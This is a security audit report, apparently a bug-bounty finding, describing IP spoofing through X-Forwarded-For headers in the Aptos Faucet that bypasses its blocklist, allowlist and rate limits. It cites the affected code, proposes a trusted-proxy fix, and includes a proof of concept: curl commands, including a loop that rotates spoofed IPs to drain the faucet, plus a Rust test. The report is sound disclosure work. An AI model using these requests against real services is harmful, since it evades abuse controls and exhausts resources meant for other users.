# Audit Report

## Title
IP Spoofing Vulnerability in Faucet Service Allows Bypass of IP-Based Security Controls

## Summary
The Aptos Faucet service relies on HTTP headers (X-Forwarded-For, X-Real-IP, Forwarded) to determine client IP addresses for security checks without validating against the actual TCP connection source IP. This allows attackers to spoof their IP address and bypass IP blocklists, allowlists, and rate limiting mechanisms.

## Finding Description

The faucet service uses poem's `RealIp` extractor to obtain the client's source IP address from incoming HTTP requests. [1](#0-0) 

The `RealIp` extractor automatically parses headers like X-Forwarded-For, X-Real-IP, and Forwarded to determine the client IP. [2](#0-1) 

This header-based IP is then extracted and stored in `CheckerData` without any validation: [3](#0-2) 

The `IpBlocklistChecker` directly uses this header-derived IP for blocklist validation: [4](#0-3) 

**The Critical Issue**: There is no verification that the header-based IP matches the actual TCP connection source IP (peer address). The code never compares the header values against the actual socket peer address, and there is no configuration for trusted proxy IP ranges.

**Attack Vector**:
1. Attacker's real IP is `1.2.3.4` (blocked or rate-limited)
2. Attacker sends HTTP request with spoofed header: `X-Forwarded-For: 5.6.7.8`
3. poem's `RealIp` extracts `5.6.7.8` from the header
4. All IP-based security checks validate against `5.6.7.8` instead of `1.2.3.4`
5. Attacker bypasses IP blocklist and rate limiting

This affects all IP-based security mechanisms:
- `IpBlocklistChecker` - Blocks specific IP ranges
- `IpAllowlistBypasser` - Allows privileged IPs to bypass all checks  
- `MemoryRatelimitChecker` - Rate limits by IP address
- `RedisRatelimitChecker` - Distributed rate limiting by IP

## Impact Explanation

This qualifies as **Medium Severity** under the Aptos Bug Bounty criteria for the following reasons:

1. **Limited Funds Loss**: An attacker can drain the faucet by bypassing rate limits, rotating through spoofed IP addresses to make unlimited funding requests. While faucet funds are typically limited test tokens, this still represents a resource loss that requires intervention.

2. **Service Availability**: Attackers can cause denial of service by exhausting faucet funds, making the service unavailable for legitimate users during testnet/devnet development.

3. **Operational Cost**: If IP-based abuse protection fails, operators may incur unexpected cloud infrastructure costs from processing fraudulent requests.

4. **Security Control Bypass**: The vulnerability completely undermines IP-based access control, which may be relied upon for privileged operations or integration with other systems.

While this does not affect the core blockchain consensus, execution, or state management, it represents a significant failure of the faucet service's security model.

## Likelihood Explanation

**Likelihood: HIGH**

This vulnerability is trivially exploitable:
- No special tools or expertise required
- Can be exploited with a simple curl command or any HTTP client
- No authentication bypass needed
- Works immediately without any preconditions
- Attacker can automate exploitation easily

The attack surface is exposed on all public faucet deployments (devnet, testnet) that accept direct HTTP connections or are behind proxies without proper IP validation.

## Recommendation

Implement proper IP validation with trusted proxy support:

```rust
// In endpoints/fund.rs or a new middleware

use poem::web::RemoteAddr;
use std::collections::HashSet;
use std::net::IpAddr;

struct TrustedIpExtractor {
    trusted_proxies: HashSet<IpAddr>,
}

impl TrustedIpExtractor {
    fn extract_real_ip(
        &self,
        remote_addr: Option<SocketAddr>,
        real_ip: RealIp,
    ) -> Result<IpAddr, AptosTapError> {
        // Get the actual TCP connection IP
        let connection_ip = remote_addr
            .map(|addr| addr.ip())
            .ok_or_else(|| AptosTapError::new(
                "No connection IP available".to_string(),
                AptosTapErrorCode::SourceIpMissing,
            ))?;

        // If the connection is from a trusted proxy, use the header-based IP
        if self.trusted_proxies.contains(&connection_ip) {
            return real_ip.0.ok_or_else(|| AptosTapError::new(
                "Trusted proxy did not provide forwarded IP".to_string(),
                AptosTapErrorCode::SourceIpMissing,
            ));
        }

        // Otherwise, use the actual connection IP
        Ok(connection_ip)
    }
}
```

**Configuration Changes**:
1. Add `trusted_proxy_ips` configuration option to `ServerConfig`
2. Extract both `RemoteAddr` and `RealIp` in endpoint handlers
3. Validate header-based IPs only when from trusted proxies
4. Log discrepancies for monitoring potential spoofing attempts

**Additional Hardening**:
- If deployed behind HAProxy/nginx, configure them to strip client-supplied proxy headers
- Use HAProxy's PROXY protocol for TCP-level IP extraction
- Implement request signing for privileged IP allowlist operations

## Proof of Concept

```bash
# Assume faucet is running at http://localhost:8081
# and IP 1.2.3.4 is blocklisted

# Step 1: Normal request from blocklisted IP fails
curl -X POST http://localhost:8081/fund \
  -H "Content-Type: application/json" \
  -d '{"address":"0x1234567890abcdef"}' \
  # This would be blocked if our real IP is in the blocklist

# Step 2: Spoof IP via X-Forwarded-For header to bypass blocklist
curl -X POST http://localhost:8081/fund \
  -H "Content-Type: application/json" \
  -H "X-Forwarded-For: 9.9.9.9" \
  -d '{"address":"0x1234567890abcdef"}' \
  # This succeeds because 9.9.9.9 is not blocklisted

# Step 3: Bypass rate limiting by rotating spoofed IPs
for i in {1..100}; do
  curl -X POST http://localhost:8081/fund \
    -H "Content-Type: application/json" \
    -H "X-Forwarded-For: 10.0.0.$i" \
    -d "{\"address\":\"0xabcd$i\"}"
done
# All requests succeed despite rate limits, each appears from different IP
```

**Rust Integration Test** (add to `crates/aptos-faucet/core/src/server/run.rs`):

```rust
#[tokio::test]
async fn test_ip_spoofing_vulnerability() -> Result<()> {
    init();
    make_ip_blocklist(&["127.0.0.1/32"])?;
    let config_content = include_str!("../../../configs/testing_checkers.yaml");
    let (port, _handle) = start_server(config_content).await?;

    // This request should fail because 127.0.0.1 is blocklisted
    // But with spoofed header, it succeeds
    let response = reqwest::Client::new()
        .post(get_fund_endpoint(port))
        .body(get_fund_request(Some(10)).to_json_string())
        .header(CONTENT_TYPE, "application/json")
        .header("X-Forwarded-For", "8.8.8.8")  // Spoofed IP
        .send()
        .await?;
    
    // This succeeds when it should fail - demonstrates the vulnerability
    assert_eq!(response.status(), reqwest::StatusCode::OK);
    Ok(())
}
```

### Citations

**File:** crates/aptos-faucet/core/src/endpoints/fund.rs (L107-108)
```rust
        // It takes into things like X-Forwarded-IP and X-Real-IP.
        source_ip: RealIp,
```

**File:** crates/aptos-faucet/core/src/endpoints/fund.rs (L217-242)
```rust
        let source_ip = match source_ip.0 {
            Some(ip) => ip,
            None => {
                return Err(AptosTapError::new(
                    "No source IP found in the request".to_string(),
                    AptosTapErrorCode::SourceIpMissing,
                ))
            },
        };

        let receiver = match fund_request.receiver() {
            Some(receiver) => receiver,
            None => {
                return Err(AptosTapError::new(
                    "Account address, auth key, or pub key must be provided and valid".to_string(),
                    AptosTapErrorCode::InvalidRequest,
                ))
            },
        };

        let checker_data = CheckerData {
            receiver,
            source_ip,
            headers: Arc::new(header_map.clone()),
            time_request_received_secs: get_current_time_secs(),
        };
```

**File:** crates/aptos-faucet/core/src/checkers/ip_blocklist.rs (L27-51)
```rust
    async fn check(
        &self,
        data: CheckerData,
        _dry_run: bool,
    ) -> Result<Vec<RejectionReason>, AptosTapError> {
        match &data.source_ip {
            IpAddr::V4(source_ip) => {
                if self.manager.ipv4_list.contains(source_ip) {
                    return Ok(vec![RejectionReason::new(
                        format!("IP {} is in blocklist", source_ip),
                        RejectionReasonCode::IpInBlocklist,
                    )]);
                }
            },
            IpAddr::V6(source_ip) => {
                if self.manager.ipv6_list.contains(source_ip) {
                    return Ok(vec![RejectionReason::new(
                        format!("IP {} is in blocklist", source_ip),
                        RejectionReasonCode::IpInBlocklist,
                    )]);
                }
            },
        }
        Ok(vec![])
    }
```
